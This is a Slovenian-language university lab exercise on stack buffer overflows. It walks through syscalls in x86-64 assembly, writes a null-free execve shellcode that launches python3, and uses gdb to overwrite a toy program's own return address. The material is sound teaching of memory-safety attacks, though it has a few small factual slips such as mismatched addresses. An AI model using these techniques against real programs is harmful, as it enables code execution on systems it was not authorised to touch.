# 10. Vaja: Prekoračitev medpomnilnika

## Navodila

1. Izvedite napad s prekoračitve medpomnilnika v enostavnem programu.

## Dodatne informacije

## Podrobna navodila

### 1. Prekoračitev medpomnilnika

Izvedli bomo napad s prekoračitvijo medpomnilnika v enostavnem programu, ki je bolj podrobno opisan v članku [Smashing the stack for fun and profit](https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf).

Danes uporabljamo preventivne večopravilne operacijske sisteme (preemptive multitasking operating systems). Preventivna večopravilnost je postopek, v katerem operacijski sistem računalnika uporablja določena merila, ki odločijo, kako dolgo lahko kateri koli program uporablja operacijski sistem, preden drugi program prav tako dobi priložnost uporabiti operacijski sistem.

Dejanje prevzemanja uporabe operacijskega sistema med enim in drugim programom se imenuje preventivnost (preemption). Pogost kriterij za preventivnost je preprosto pretečeni čas izvajanja programa. V nekaterih operacijskih sistemih lahko nekateri programi dobijo višjo prioriteto kot drugi programi, kar jim omogoča nadzor nad tem kdaj pridobijo in za kako dolgo imajo na voljo uporabo operacijskega sistema.

V računalniku imamo [zunanje naprave, pomnilnik in procesor](https://en.wikipedia.org/wiki/Von_Neumann_architecture), ki izvaja programe iz pomnilnika. V procesorju [ukazni ali programski števec (instruction pointer (IP) or program counter (PC))](https://en.wikipedia.org/wiki/Program_counter) kaže na celico v pomnilniku, ki vsebuje trenutni ukaz izbranega programa, ki se izvaja.

Procesor lahko zunanje naprave prekinjajo. Ena izmed takih naprav je ura, ki v praksi pogosti sproži [prekinitev (interrupt)](https://en.wikipedia.org/wiki/Interrupt) izvajanja trenutnega programa. Ob določeni prekinitvi lahko procesor skoči na kos programske kode, ki predstavlja operacijski sistem, ki vsebuje med drugim tudi [tabelo procesov](https://www.geeksforgeeks.org/process-table-and-process-control-block-pcb/). 

Tabela procesov ima za vsak proces enolični identifikator ter podatke o procesu, ki med drugim vsebujejo tudi lokacijo ukaza v pomnilniku pri katerem se je proces nazadnje vstavil.

Ob časovni prekinitvi se izvajanje trenutnega procesa prekine in procesor skoči na izvajanje programske kode operacijskega sistema, ki pogleda v tabelo procesov, kateri proces se bo izvajal naslednji in nastavi ukazni števec na lokacijo zadnjega ukaza pri katerem se je proces vstavil pri prejšnjem izvajanju. Tako procesor sedaj začne izvajanje novega procesa naprej od točke, kjer se je predhodno ustavil.

Ko proces želi prebrati datoteko, izvede poseben ukaz za branje datoteke, ki izvajanje procesa ustavi in zaprosi operacijski sistem za datoteko. Ko operacijski sistem naloži zahtevano datoteko v pomnilnik, nato ponovno požene izvajanje procesa, seveda šele, ko pride na vrsto s strani drugih procesov. Med tem, ko je proces bil ustavljen in je čakal na datoteko je operacijski sistem prepustil izvajanje drugim procesom.

Ko proces želi izvesti določeno funkcionalnost, ki jo ponuja operacijski sistem, izvede ukaz za sistemski klic (`syscall`). Na primer za odpiranje datoteke, pisanje v datoteko, odpiranje povezave preko omrežja, zagon programa...

Ukaz za izvedbo sistemskega klica je [`INT 0x80`](https://blog.packagecloud.io/the-definitive-guide-to-linux-system-calls/) na Intel 32-bitnih procesorjih, ki poganjajo 32-bitni operacijski sistem. `INT` nam določi prekinitev, `0x80` pa številko prekinitve, ki v tem primeru prestavlja sistemski klic.

Pri 32-bitnih operacijskih sistemih prožimo prekinitev `int` za sistemski klic, kateri podamo v registru `eax` številko sistemskega klica, ki ga želimo izvesti ter parametre v ostalih registrih (`ebx`, `ecx`, `edx`, `esi` in `edi`) ali pa jih prenesemo preko sklada (stack). Sistemski klici so predhodno določeni ter so opisani v [tabeli 32-bitnih sistemskimi klicev](https://syscalls.w3challs.com/?arch=x86).

Pri 64-bitnih operacijskih sistemih ne prožimo več prekinitve, vendar kar pokličemo ukaz `syscall` in mu podamo številko klica, ki ga želimo izvesti v register `rax`, parametri pa sledijo v ostalih registrih (`rdi`, `rsi`, `rdx`, `r1`, `r8` in `r9`). Sistemski klici so opisani v [tabeli 64-bitnih sistemskimi klicev](https://syscalls.w3challs.com/?arch=x86_64).

Sedaj napišemo program v programskem jeziku C, ki bo zagnal nek drug program. Drug program lahko požene le preko sistemskega klica [`exec`](https://en.wikipedia.org/wiki/Exec_(system_call)).

V splošnem poženemo program takole `program file1 -d rw 1` in ob zagonu ima program podane naslednje stvari:

- Seznam argumentov (`args`), kjer prvi argument z indeksom nič vedno predstavlja ime programa: [`program`, `file1`, `-d`, `rw`, `1`].
- Odprte tri standardne datoteke (`file descriptors`): 0 - standard vhod (`stdin`), 1 -  standard izhod (`stdout`) in 2 - standardni izhod napak (`stderr`).
- Okoljske spremenljivke okolja v katerem se izvaja program (`env`).

Napišemo kratek program v programskem jeziku C, ki bo pognal ukazno lupino programskega jezika `python`. Ker želimo slediti splošnemu izvajanju programov, izberemo funkcijo `execve` za zagon drugega programa iz programa samega:

`int execve(char const *path, char const *argv[], char const *envp[]);`

    nano program.c

    #include <unistd.h>

    int main(int argc, char *argv[]) {
        execve("/usr/bin/python3", NULL, NULL);
        return 0;
    }

Program sedaj prevedemo z ukazom [`gcc`](https://manpages.org/gcc) in ga poženemo, da preverimo če deluje.

    apt update
    apt install build-essential

    gcc program.c -o program
    ./program

V programskem jeziku `python` lahko sistemske klice kličemo preko knjižnice `sys`. Sedaj pa poglejmo kodo našega programa v zbirnem jeziku.

    gcc program.c -S -o program.S
    ./program

    less program.S

        .file   "program.c"
        .text
        .section        .rodata
    .LC0:
        .string "/usr/bin/python3"
        .text
        .globl  main
        .type   main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq   %rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq    %rsp, %rbp
        .cfi_def_cfa_register 6
        subq    $16, %rsp
        movl    %edi, -4(%rbp)
        movq    %rsi, -16(%rbp)
        movl    $0, %edx
        movl    $0, %esi
        leaq    .LC0(%rip), %rax
        movq    %rax, %rdi
        call    execve@PLT
        movl    $0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size   main, .-main
        .ident  "GCC: (Debian 12.2.0-14) 12.2.0"
        .section        .note.GNU-stack,"",@progbits

Glavni ukazi v kodi so:

- `.LC0` - Oznaka, ki predstavlja simbolično ime za naslov v pomnilniku niza `"/usr/bin/python3"` v naslednji vrstici.
- `.string "/usr/bin/python3"` - Direktiva, ki definira konstanto tipa niz, ki vsebuje vrednost `"/usr/bin/python3"` in se končna z znakom `\0`.
- `.LFB0` - Oznaka, ki določi začetek funcije.
- `pushq   %rbp` - Ukaz, ki naloži trenutno vrednost registra baznega kazalca klicatelja te funkcije (`%rbp`) na sklad.
- `movq	%rsp, %rbp` - Ukaz, ki premakne vrednost registra skladovnega kazalca (`%rsp`) v register baznega kazalca (`%rbp`). S tem se nastavi izhodišče za okvir sklada `main` funkcije.
- `subq	$16, %rsp` - Ukaz, ki odšteje 16 od vrednosti registra skladovnega kazalca (`%rsp`). S tem pripravi 16 bajtov prostora za lokalne spremenljivke znotraj `main` funkcije.
- `movl	%edi, -4(%rbp)` - Ukaz, ki naloži vrednost registra `%edi` v pomnilnik in sicer 4 bajte pod naslovom pomnilnika shranjenega v `%rbp`. Register `%edi` vsebuje vrednost prvega argumenta podanega funkciji `main`, ki predstavlja `argc`, torej število argumentov.
- `movq	%rsi, -16(%rbp)` - Ukaz, ki naloži vrednost registra `%rsi` v pomnilnik in sicer 16 bajtov pod naslovom pomnilnika shranjenega v `%rbp`. Register `%rsi` vsebuje vrednost drugega argumenta podanega funkciji `main`, ki predstavlja `argv`, torej kazalec na tabelo argumentov v pomnilniku.
- `movl	$0, %edx` - Ukaz, ki nastavi vrednost registra `%edx` na 0. S tem nastavi vrednost argumenta `envp` sistemskega klica `execve` na `NULL`.
- `movl	$0, %esi` - Ukaz, ki nastavi vrednost registra `%esi` na 0. S tem nastavi vrednost argumenta `argv` sistemskega klica `execve` na `NULL`.
- `leaq	.LC0(%rip), %rax` - Ukaz, ki naloži efektivni naslov oznake `.LC0` (relativen, glede na trenuten naslov kamor kaže ukazni kazalec `%rip`) v register `%rax`. Izračuna torej naslov v pomnilniku, kjer se nahaja niz `"/usr/bin/python3"` in ga naloži v `%rax`. Relativno naslavljanje z uporabo ukaznega kazalca `%rip` naredi kodo neodvisno od njene lokacije v pomnilniku.
- `movq	%rax, %rdi` - Ukaz, ki naloži naslov niza `"/usr/bin/python3"` iz `%rax` v `%rdi`. S tem nastavi vrednost argumenta `pathname` sistemskega klica `execve` na `"/usr/bin/python3"`.
- `call	execve@PLT` - Ukaz, ki izvede `execve` funcijo z pripravljenimi argumenti v `%rdi` - `pathname` - `"/usr/bin/python3"`, `%esi` - `argv` - `NULL` in `%edx` - `envp` - `NULL`. Oznaka `@PLT` povzroči, da gre `call` skozi [PLT tabelo (angl. Procedure Linkage Table)](https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html), kar omogoča dinamično povezovanje funkcij knjižnjice. Če je klic `execve` se program ne vrne več nazaj, torej se preostali ukazi izvedejo le, če je klic neuspešen.
- `movl	$0, %eax` - Ukaz, ki naloži vrednost nič v register `%eax`. S tem nastavi vrednost, ki jo vrne funkcija `main` na 0.
- `leave` - Ukaz, ki naloži vrednost registra baznega kazalca (`%rbp`) nazaj v register skladnega kazalca (`%rsp`) in tako efektivno odstrani prostor lokalnega sklada ter nato z sklada naloži bazni kazalec programa, ki je poklical funkcijo `main` v register baznega kazalca `%rbp` (ekvivalentno ukazu `movq	%rbp, %rsp` ki mu sledi `popq	%rbp`).

Ukaz `call` izvede sistemski klic `exec`, ki je definiran v sistemski knjižnici, ki potem naprej izvaja sistemske klic. Nadomestili ga bomo s prekinitvijo in nastavili pravilne vrednosti v registrih, da bomo direktno izvedli enak sistemski klic:
- Ukaz `movl	$0, %edx` za nastavljanje `envp` sedaj nastavlja register `%rdx` -> `mov	$0, %rdx`.
- Ukaz `movl	$0, %esi` za nastavljanje `argv` sedaj nastavlja register `%rsi` -> `mov	$0, %rsi`.
- Ukaz `leaq	.LC0(%rip), %rax` za nastavljanje `pathname` sedaj nastavlja register `rdi` -> `leaq	.LC0(%rip), %rdi`.
- Dodamo ukaz `mov	$59, %rax`, ki nastavi vrednost 59 v registru `%rax`, ki predstavlja sistemski klic `execve`.
- Nadomestimo vrstico `call	execve@PLT` z `syscall`.

Sedaj program ponovno prevedemo in preizkusimo njegovo delovanje.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)

        mov	$0, %rdx
        mov	$0, %rsi
        leaq	.LC0(%rip), %rdi
        mov	$59, %rax
        syscall

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size	main, .-main
        .ident	"GCC: (Debian 10.2.1-6) 10.2.1 20210110"
        .section	.note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

Ta program želimo sedaj predstaviti kot niz, da ga lahko podamo na poljubni tekstovni vhod in poskusimo prepričati program, ki bere vhod, da ga požene. To lahko dosežemo le, če poznamo kako deluje pomnilnik v računalniku. Pomnilnik si lahko predstavljamo kot veliko tabelo, kjer ima vsaka celica svoj naslov, preko katerega lahko dostopamo do nje. Celice so v tabeli urejene tako, da se zgoraj nahajajo celice z nizkimi naslovi in z visokimi naslovi spodaj. Po dogovoru se v spodnjem delu pomnilniku nahaja operacijski sistem, od vrha navzdol pa si sledijo programi.

Če pogledamo del pomnilnika, ki predstavlja program (angl. Program frame), ima le ta na vrhu pomnilnika shranjeno programsko kodo (`Text`), nato sledijo konstante (`Data` in `Block Started by Symbol`) in dve dinamični strukturi: kopica (angl. heap - `Heap`), ki je takoj za konstantami, se povečuje navzgor ter vsebuje interne spremenljivke programa; ter sklad (angl. stack  - `Stack`), ki se nahaja zgoraj v pomnilniku programa, se povečuje navzdol ter vsebuje argumente funkcije, spremenljivke režije sklada in vrnitveni naslov klicatelja.

![](ProgramFrame.drawio.svg)

Ko program pokliče poljubno funkcijo, mora ob klicu shraniti na sklad naslov ukaza v pomnilniku kamor se mora vrniti, ko se funkcija izvede. Poleg vrnitvenega naslova na sklad shrani argumente. Če ne pazimo, lahko vrnitveni naslov prepišemo z drugim naslovom, ki pa lahko kaže na poljuben ukaz v pomnilniku tega programa. Znotraj programa pa lahko imamo niz, ki vsebuje ukaze za zagon drugega programa. Vrnitveni naslov se nahaja pod samim skladom, zato ga lahko prepišemo z manipulacijo sklada oz. razlitjem sklada (Stack-overflow).

Najprej natančneje ugotovimo kje se nahaja vrnitveni naslov, zato v naš program dodamo skok do poljubne funkcije ter vrnitev iz funkcije nazaj v program. V programu izbrišemo ukaz `leaq` saj bomo niz podali kar direktno. Potem skočimo na del programa `jumppoint`, ki izvede klic na funkcijo `myfunction`. Pri klicu funkcije se shrani naslov naslednjega ukaza na sklad in ga potem poberemo s sklada v register `%rdi`, da se lahko vrnemo nazaj.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)

        jmp     jumppoint
    myfunction:
        pop     %rdi
        mov	    $0, %rsi
        mov	    $0, %rdx
        mov	    $59, %rax
        syscall
    jumppoint:
        call    myfunction
        .string	"/usr/bin/python3"

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size	main, .-main
        .ident	"GCC: (Debian 10.2.1-6) 10.2.1 20210110"
        .section	.note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

Ker bo naš program predstavljen kot niz, le ta ne sme vsebovati nobene ničle, saj splošne funkcije za branje nizov pričakujejo v programskem jeziku C pričakujejo posebni končni znak na koncu niza, da vedo kdaj morajo prenehati z branjem. In ta posebni končni znak vsebuje ničlo (`\0`). Zato nadomestimo vse ukaze, ki direktno zapisujejo ničle v registre z logično operacijo XOR. V primeru, ko zapisujemo vrednost 59 v register `%rax` pa tega ne moremo uporabiti, zato register najprej nastavimo na nič, tako da uporabimo logično operacijo XOR in nato zapišemo vrednost 59 le v spodnji bajt registra (spodnjih 8 bit registra `%rax` lahko dostopamo preko registra `%al`), saj se pri tem pri prevajanju ne dodajo ničle pred vrednostjo 59 do polne dolžine registra.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)

        jmp     jumppoint
    myfunction:
        pop     %rdi
        xor	    %rsi, %rsi
        xor	    %rdx, %rdx
        xor     %rax, %rax
        mov	    $59, %al
        syscall
    jumppoint:
        call    myfunction
        .string	"/usr/bin/python3"

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size	main, .-main
        .ident	"GCC: (Debian 10.2.1-6) 10.2.1 20210110"
        .section	.note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

Torej imamo program, ki ga lahko podamo kot niz drugemu programu, ki bo pognal nek drug program, v našem primeru `python` interpreter. Sedaj napišimo nek program, ki bo prejel ta niz, na tak način, da mu bo povozil sklad. Izvedli bomo torej napad s prelivom sklada. Napišimo preprost program v programskem jeziku C.

    nano stacky.c

    #include <stdio.h>

    int callme(int a, unsigned long *b){
        unsigned long *f;
        /* Add something here so that we jump over line: c = c + e */
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -o stacky
    ./stacky
    
    c: 16

Želimo da, ko se vračamo iz funkcije, skočimo direktno na ukaz `printf` in tako preskočimo vrstic `c = c + e;`. To bomo dosegli tako, da bomo pokvarili sklad. Da ugotovimo v kaj se naš program `stacky` prevede in kako se izvaja, lahko omogočimo razhroščevanje z [Debugger GDB](https://sourceware.org/gdb/). Interaktivno okolje za razhroščevanje pokličemo z ukazom [`gdb`](https://manpages.org/gdb) in nato z ukazom `run` poženemo program, z ukazom `break` nastavimo točko kjer se izvajanje ustavi, z ukazom `s` se premaknemo na naslednji ukaz in ukaz `disassemble` nam prikaže kodo v zbirnem jeziku.

    apt update
    apt install gdb

    gcc stacky.c -g -o stacky

    gdb stacky

    Reading symbols from stacky...
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    c: 16
    [Inferior 1 (process 2872) exited normally]
    (gdb) break main
    Breakpoint 1 at 0x55555555515c: file stacky.c, line 12.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, main () at stacky.c:12
    12	        c = 5;
    (gdb) s
    13	        d = 3;
    (gdb) disassemble callme
    Dump of assembler code for function callme:
        0x0000555555555139 <+0>:	push   %rbp
        0x000055555555513a <+1>:	mov    %rsp,%rbp
        0x000055555555513d <+4>:	mov    %edi,-0x4(%rbp)
        0x0000555555555140 <+7>:	mov    %rsi,-0x10(%rbp)
        0x0000555555555144 <+11>:	mov    -0x10(%rbp),%rax
        0x0000555555555148 <+15>:	mov    (%rax),%rax
        0x000055555555514b <+18>:	mov    %eax,%edx
        0x000055555555514d <+20>:	mov    -0x4(%rbp),%eax
        0x0000555555555150 <+23>:	add    %edx,%eax
        0x0000555555555152 <+25>:	pop    %rbp
        0x0000555555555153 <+26>:	ret
    End of assembler dump.

Ko pridemo v funkcijo `callme`, imamo na skladu shranjen naslov na katerega se moramo vrniti po zaključku funkcije (return address). Ukazi funkcije so:

- Ukaz `push    %rbp` na sklad shrani staro vrednost v registru `%rbp`. Ta ukaz zmanjša vrednost `%rsp` za 4.
- Ukaz `mov    %rsp,%rbp` shranimo vrednost registra `%rsp` v register `%rbp`. Splošni register `%rbp` (base pointer) kaže na začetek lokalnih spremenljivk oz. začetek lokalnega sklada. Register `%rsp` (stack pointer) prav tako kaže na začetek lokalnega sklada in ga ukaza za delo s skladom `push` in `pop` implicitno popravljata. 
- Ukaz `mov    %edi,-0x4(%rbp)` naloži vrednost iz registra `%edi` v pomnilnik na naslov, ki je za 4 bajte manjši od naslova, ki ga hrani `%rbp`. Register `%edi` hrani prvi argument fukncije `callme`, in sicer spremenljivko `a`, ki je 32-bitno celo število.
- Ukaz `%mov    rsi,-0x10(%rbp)` naloži vrednost iz registra `%rsi` v pomnilnik na naslov, ki je za 16 bajtov manjši od naslova, ki ga hrani `%rbp`. Register `%rsi` hrani drugi argument fukncije `callme`, in sicer kazalec na spremenljivko `b`, ki je 64-bitno nepredznačeno celo število.
- Ukaz `mov    -0x10(%rbp),%rax` prestavi kazalec spremenljivke `b` iz naslova `(%rbp - 0x10)` v pomnilniku v register `%rax`.
- Ukaz `mov    (%rax),%rax` prebere vrednost kazalca spremenljivke v `%rax` in iz pomnilniškega naslova na katerega kaže prebere dejansko vrednost in jo shrani v `%rax`.
- Ukaz `mov    %eax,%edx` naloži spodnjih 32-bitov registra `%rax` (`%eax`) v spodnjih 32-bitov registra `%rdx` (`%edx`).
- Ukaz `mov    -0x4(%rbp),%eax` prestavi spremenljivko `a` iz naslova `(%rbp - 0x4)` v pomnilniku v register `%eax`.
- Ukaz `add    %edx,%eax` sešteje vrednosti v registrih `%eax` in `%edx` in shrani rezultat v register `%eax`.
- Ukaz `pop    %rbp` brebere klicateljev bazni kazalec s sklada in ga naloži v register `%rbp`, pri tem se tudi implicitno poveča kazalec sklada `%rsp`.
- Ukaz `ret` naloži vrnitveni naslov z glave sklada, kamor ga je naložil klicatelj ob klicu funkcije `callme` in skoči na prebrani naslov. Register `%eax` pa hrani vrednost, ki jo vrne funkcija `callme`.

Okvir sklada (angl. Stack Frame) je del sklada, ki je relevanten za trenutno funkcijo in vsebuje vsaj:

- vrnitveni naslov klicatelja,
- kazalec starega okvirja (`%rsp`) klicatelja;

lahko pa tudi še:

- lokalne spremenljivke,
- argumente funkcije,
- shranjene vrednosti registrov in
- začasne vrednosti.

Delovanje programa želimo spremeniti tako, da vrinemo kos kode, ki nam bo povozil vrnitveni naslov, ki je shranjen na skladu. Ugotoviti moramo kam kaže vrnitveni naslov, kaj se dogaja v glavnem programu ter ugotoviti za koliko moramo vrnitveni naslov popravit. Da to lahko naredimo, moramo dopolniti naš program. Dodamo mu konstanto `X`, ki nam prva predstavlja odmik od naslova spremenljivke `a` v pomnilniku do naslova vrnitvenega naslova v pomnilniku, torej 8 bajtov pod vrednostjo v registru `%rsp`.

Dodamo naslednjo vrstico `f = (unsigned long*)(((char*)&a) + X);`, kjer `&a` vrne naslov v pomnilniku, kjer se nahaja lokalna spremenljivka `a`, ki se nahaja v trenutnem okvirju sklada. Nato naslov spremenimo iz `int*` v `char*` z `(char*)&a`, da lahko naslov povečujemo po 1 bajt naekrat in in ne po 4 bajte. Naslov nato povečamo za pravilno število bajtov `X` in ga premenimo v kazalec nepredznačenege celega števila z ukazom `(unsigned long*)` ter priredimo rezultat kazalcu `f`.

Torej `f` sedaj kaže na naslov v pomnilniku, kjer se nahaja vrnitveni naslov klicatelja funkcije `callme`. Dodamo še naslednjo vrstico `*f = *f + Y; `, ki popravi vrnitveni naslov za `Y`, ki je ravno pravšnji, da po vrnitvi iz funkcije `callme` preskočimo vrstico `c = c + e;` in začnemo izvajati vrstico `printf("c: %d\n", c);`.

    nano stacky.c

    #include <stdio.h>

    #define X 66
    #define Y 66

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
        *f = *f + Y;				            // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

Sedaj uporabimo razhroščevalnik `gdb`, da lahko določimo konstanti `X` in `Y`. Najprej bomo popravili vrstico `f = (unsigned long*)(((char*)&a) + X);`, tako da bo spremenljivka `f` vsebovala naslov v pomnilniku kjer se nahaja vrnitveni naslov. Nastavimo prekinitveno točko z ukazom `break` na začetek funkcije `callme`. Nato izvedemo par vrstic funkcije z ukazom `s`, da dobimo pravilno vrednost v register `%rsp`. Sedaj lahko izpišemo programski kodo glavnega programa v zbirniku z ukazom `disassemble`. Klic funkcije `callme` se izvede z vrstico `call   0x555555555139 <callme> `, vrnitveni naslov pa kaže na naslednjo vrstic `cltq` z naslovom `0x00005555555551a7`.

Za izpis vrednosti uporabimo ukaz `p` z zastavico za šestnajstiški izpis `/x` in izpišemo vrnitveni naslov v spomni na naslovu, ki je 8 bajtov za naslovom kamor kaže register `%rsp`, ki mora biti enak naslovu vrstice `cltq` v glavnem delu programa. V spremenljivko `f` moramo shraniti vrednost, ki se nahaja 8 bajtov nad `%rsp`, saj `%rsp` trenutno kaže na vrh sklada oz. na prvi prosti naslov nad skladom, 4 bajte nad `%rsp` se nahaja stari `%rbp` in 8 bajtov nad `%rsp` se nahaja vrnitveni naslov. Izračunamo razliko med naslovom, kjer se nahaja spremenljivka `a` in naslovom, ki se nahaja 8 bajtov nad `%rsp`, ki je 28 in jo shranimo v konstanto `X`. Torej če naslovu `&a` prištejemo 28, dobimo naslov, ki kaže na vrnitveni naslov.

    gcc stacky.c -g -o stacky

    gdb stacky.c

    Reading symbols from stacky...
    (gdb) break callme
    Breakpoint 1 at 0x1144: file stacky.c, line 8.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, callme (a=3, b=0x7fffffffe050) at stacky.c:8
    8	        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
    (gdb) s
    9	        *f = *f + Y;
    (gdb) s
    10	        return a + *b;
    (gdb) disassemble main 
    Dump of assembler code for function main:
        0x0000555555555172 <+0>:	push   %rbp
        0x0000555555555173 <+1>:	mov    %rsp,%rbp
        0x0000555555555176 <+4>:	sub    $0x10,%rsp
        0x000055555555517a <+8>:	movl   $0x5,-0x4(%rbp)
        0x0000555555555181 <+15>:	movl   $0x3,-0x8(%rbp)
        0x0000555555555188 <+22>:	mov    -0x4(%rbp),%edx
        0x000055555555518b <+25>:	mov    -0x8(%rbp),%eax
        0x000055555555518e <+28>:	add    %edx,%eax
        0x0000555555555190 <+30>:	cltq
        0x0000555555555192 <+32>:	mov    %rax,-0x10(%rbp)
        0x0000555555555196 <+36>:	lea    -0x10(%rbp),%rdx
        0x000055555555519a <+40>:	mov    -0x8(%rbp),%eax
        0x000055555555519d <+43>:	mov    %rdx,%rsi
        0x00005555555551a0 <+46>:	mov    %eax,%edi
        0x00005555555551a2 <+48>:	call   0x555555555139 <callme>
        0x00005555555551a7 <+53>:	cltq
        0x00005555555551a9 <+55>:	mov    %rax,-0x10(%rbp)
        0x00005555555551ad <+59>:	mov    -0x10(%rbp),%rax
        0x00005555555551b1 <+63>:	mov    %eax,%edx
        0x00005555555551b3 <+65>:	mov    -0x4(%rbp),%eax
        0x00005555555551b6 <+68>:	add    %edx,%eax
        0x00005555555551b8 <+70>:	mov    %eax,-0x4(%rbp)
        0x00005555555551bb <+73>:	mov    -0x4(%rbp),%eax
        0x00005555555551be <+76>:	mov    %eax,%esi
        0x00005555555551c0 <+78>:	lea    0xe3d(%rip),%rax        # 0x555555556004
        0x00005555555551c7 <+85>:	mov    %rax,%rdi
        0x00005555555551ca <+88>:	mov    $0x0,%eax
        0x00005555555551cf <+93>:	call   0x555555555030 <printf@plt>
        0x00005555555551d4 <+98>:	mov    $0x0,%eax
        0x00005555555551d9 <+103>:	leave
        0x00005555555551da <+104>:	ret
    End of assembler dump.
    (gdb) p/x *(unsigned long*)($rsp+8) 
    $1 = 0x5555555551a7
    (gdb) disassemble callme
    Dump of assembler code for function callme:
        0x0000555555555139 <+0>:	push   %rbp
        0x000055555555513a <+1>:	mov    %rsp,%rbp
        0x000055555555513d <+4>:	mov    %edi,-0x14(%rbp)
        0x0000555555555140 <+7>:	mov    %rsi,-0x20(%rbp)
        0x0000555555555144 <+11>:	lea    -0x14(%rbp),%rax
        0x0000555555555148 <+15>:	add    $0x42,%rax
        0x000055555555514c <+19>:	mov    %rax,-0x8(%rbp)
        0x0000555555555150 <+23>:	mov    -0x8(%rbp),%rax
        0x0000555555555154 <+27>:	mov    (%rax),%rax
        0x0000555555555157 <+30>:	lea    0x42(%rax),%rdx
        0x000055555555515b <+34>:	mov    -0x8(%rbp),%rax
        0x000055555555515f <+38>:	mov    %rdx,(%rax)
        => 0x0000555555555162 <+41>:	mov    -0x20(%rbp),%rax
        0x0000555555555166 <+45>:	mov    (%rax),%rax
        0x0000555555555169 <+48>:	mov    %eax,%edx
        0x000055555555516b <+50>:	mov    -0x14(%rbp),%eax
        0x000055555555516e <+53>:	add    %edx,%eax
        0x0000555555555170 <+55>:	pop    %rbp
        0x0000555555555171 <+56>:	ret
    End of assembler dump.
    (gdb)  p $rsp+8
    $2 = (void *) 0x7fffffffe048
    (gdb) p &a 
    $3 = (int *) 0x7fffffffe02c
    (gdb) p (unsigned long)($rsp + 8) - (unsigned long)&a 
    $4 = 28

Sedaj popravimo vrstico `#define X 28` in prevedemo kodo ter preverimo ali spremenljivka `f` vsebuje vrnitveni naslov `0x5555555551a3`, ki kaže na ukaz `cltq`.

    nano stacky.c

    #include <stdio.h>

    #define X 28
    #define Y 0

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
        *f = *f + Y;				            // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky

    gdb stacky

    Reading symbols from stacky...
    (gdb) break callme
    Breakpoint 1 at 0x1144: file stacky.c, line 8.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, callme (a=3, b=0x7fffffffe050) at stacky.c:8
    8	        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
    (gdb) s
    9	        *f = *f + Y;
    (gdb) s
    10	        return a + *b;
    (gdb) p $rsp+8 
    $1 = (void *) 0x7fffffffe048
    (gdb) p f
    $2 = (unsigned long *) 0x7fffffffe048
    (gdb) p/x *f
    $3 = 0x5555555551a7

